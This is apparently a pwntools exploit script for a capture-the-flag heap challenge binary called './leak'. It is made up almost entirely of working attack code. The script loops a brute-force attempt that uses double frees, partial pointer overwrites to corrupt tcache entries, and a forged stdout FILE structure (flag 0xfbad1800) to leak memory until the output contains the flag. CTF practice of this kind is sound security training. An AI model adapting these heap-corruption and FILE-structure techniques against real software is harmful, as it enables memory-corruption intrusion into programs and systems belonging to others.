from pwn import * 
from LibcSearcher import * 
# context.log_level = 'debug' 

def add(index,size):
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
def edit(index,content):
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Content: ')
    p.send(content)
def free(index):
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
def exit():
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'6')
time=0
while 1:
    time=time+1
    print("time:",time)
    p=process('./leak')
    elf=ELF('./leak')
    p.recvuntil(b'set up.\n')
    add(0,0xb0)
    add(1,0xb0)
    add(2,0x50)
    add(14,0xb0)
    add(15,0x200)
    for i in range(3):
        free(0)
        edit(0,p64(0)*2)
        free(1)
        edit(1,p64(0)*2)
    free(0)
    free(1)
    add(3,0x50)
    add(4,0x50)
    edit(1,b'\x60\xc7')
    add(5,0xb0)
    add(6,0xb0)
    add(7,0xb0)
    edit(1,p64(0)*11+p64(0x61))
    free(0)
    edit(0,p64(0)*2)
    free(14)
    edit(14,p64(0)*2)
    free(0)
    edit(0,p64(0)*2)
    for i in range(3):
        free(2)
        edit(2,p64(0)*2)
        free(4)
        edit(4,p64(0)*2)
    free(2)
    free(4)
    edit(1,p64(0)*11+p64(0xc1))

    free(4)
    edit(2,p64(0)*2)
    edit(4,b'\x68\xc7')
    edit(7,p64(0xfbad1800)+p64(0)*4+p64(0x5fffffffffff))
    edit(1,p64(0)*11+p64(0x61))


    add(8,0x50)
    add(9,0x50)

    edit(7,p64(0xfbad1800)+p64(0)*3+b'\x50\xf2')
    exit()
    recvthing=p.recv(100)
    if b'flag' in recvthing:
        print('flag:[',recvthing,']')
        break
    # gdb.attach(p)

    # p.interactive()